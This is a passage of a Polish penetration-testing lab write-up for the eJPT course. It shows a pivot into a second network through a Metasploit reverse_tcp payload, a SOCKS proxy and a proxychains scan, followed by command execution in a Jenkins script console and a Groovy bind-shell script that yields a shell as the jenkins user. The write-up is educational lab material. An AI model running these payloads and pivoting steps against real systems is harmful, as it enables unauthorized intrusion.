+</code></pre></div><h2 id="pivot-do-drugiej-maszyny">Pivot do drugiej maszyny<a hidden class="anchor" aria-hidden="true" href="#pivot-do-drugiej-maszyny">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@online-calc:/# ip addr
+ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: ip_vti0@NONE: &lt;NOARP&gt; mtu <span style="color:#ae81ff">1480</span> qdisc noop state DOWN group default qlen <span style="color:#ae81ff">1000</span>
+    link/ipip 0.0.0.0 brd 0.0.0.0
+29400: eth0@if29401: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default 
+    link/ether 02:42:c0:50:08:03 brd ff:ff:ff:ff:ff:ff link-netnsid <span style="color:#ae81ff">0</span>
+    inet 192.80.8.3/24 brd 192.80.8.255 scope global eth0
+       valid_lft forever preferred_lft forever
+29402: eth1@if29403: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default 
+    link/ether 02:42:c0:cf:ce:02 brd ff:ff:ff:ff:ff:ff link-netnsid <span style="color:#ae81ff">0</span>
+    inet 192.207.206.2/24 brd 192.207.206.255 scope global eth1
+       valid_lft forever preferred_lft forever
+</code></pre></div><p>Adres obecnej maszyny do której musimy się dostać to <code>192.207.206.x</code>. Ponieważ nie mam dostępu do narzędzi &ldquo;spoza&rdquo; środowiska. Muszę użyć <code>msfvenom</code> i <code>Metasploit</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.80.8.2 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9010</span> -f elf &gt; exp.bin
+</code></pre></div><p>Pobrałem plik z maszyny używając serwera http od Pythona. Włączyłem <code>Metasploit</code> na <code>multi/handler</code> oraz ten sam payload co <code>msfvenom</code> czyli <code>linux/x64/meterpreter/reverse_tcp</code> oraz IP. Dostałem połączenie. Próbowałem wykonać pivot poprzez <code>autoroute</code> w <code>Metasploicie</code> jednak coś nie działało poprawnie. Musiałem użyć modułu <code>auxiliary/server/socks_proxy</code>. Jednak najpierw muszę przeprowadzić routing na nową podsieć.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; route add 192.43.33.0/24 <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Route added
+</code></pre></div><p>Ustawiam port na <code>9050</code>, ponieważ INE w swoich labach ma domyślne ustawienia SOCKS w ``
+<code>/etc/proxychains4.conf</code> na port <code>socks4  127.0.0.1 9050</code>.</p>
+<p>Wiedziałem, że druga maszyna ma IP <code>192.207.206.3</code> z poprzednich prób z <code>Metasploitem</code>.</p>
+<p>Teraz możemy przerowadzić skan portów przez <code>proxychains</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use auxiliary/server/socks_proxy
+set SRVPORT <span style="color:#ae81ff">9050</span>
+set VERSION 4a
+
+msf6 auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; proxychains nmap -sT -P0 192.207.206.3
+Nmap scan report <span style="color:#66d9ef">for</span> ns1.recife.pe.gov.br <span style="color:#f92672">(</span>192.207.206.3<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.0011s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+</code></pre></div><p>Teraz po tych wszystkich operacjach, gdy wejdziemy w proxy przeglądarki i ustawimy na <code>127.0.0.1</code> port z proxychaina czyli <code>9050</code>, możemy wejść na port <code>8080</code> z &ldquo;obcej&rdquo; sieci.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621023527.png" alt=""  />
+</p>
+<h2 id="panel-jenkins">Panel Jenkins<a hidden class="anchor" aria-hidden="true" href="#panel-jenkins">#</a></h2>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621023731.png" alt=""  />
+</p>
+<p>Wersja <code>Jenkins ver. 2.225</code>.</p>
+<p>Prosty command injection w Jenkinsie.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd=&#39;whoami&#39;
+println cmd.execute().text
+</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621031344.png" alt=""  />
+</p>
+<p>Otrzymanie shella jest równie proste.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">int port=5555;
+String cmd=&#34;/bin/sh&#34;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
+Socket s = new java.net.ServerSocket(port).accept()
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre></div><p>Następnie łączę się z drugą maszyną przez dany port <code>5555</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:/usr/share/nishang/Shells# proxychains nc -v 192.43.33.3 <span style="color:#ae81ff">5555</span>
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.15
+Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  127.0.0.1:9050  ...  192.43.33.3:5555  ...  OK
+Ncat: Connected to 192.43.33.3:5555.
+id 
+uid<span style="color:#f92672">=</span>105<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span>
+</code></pre></div><p>:)</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://suszczyk.github.io/tags/ejpt/">eJPT</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>LogForge - HackTheBox</span>
+  </a>
+  <a class="next" href="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-1/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>Black-Box Penetration Test 1</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on twitter"
+        href="https://twitter.com/intent/tweet/?text=Black-Box%20Penetration%20Test%202&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f&amp;hashtags=Linux%2cEasy%2ceJPT">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f&amp;title=Black-Box%20Penetration%20Test%202&amp;summary=Black-Box%20Penetration%20Test%202&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f&title=Black-Box%20Penetration%20Test%202">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on whatsapp"
+        href="https://api.whatsapp.com/send?text=Black-Box%20Penetration%20Test%202%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 2 on telegram"
+        href="https://telegram.me/share/url?text=Black-Box%20Penetration%20Test%202&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-2%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
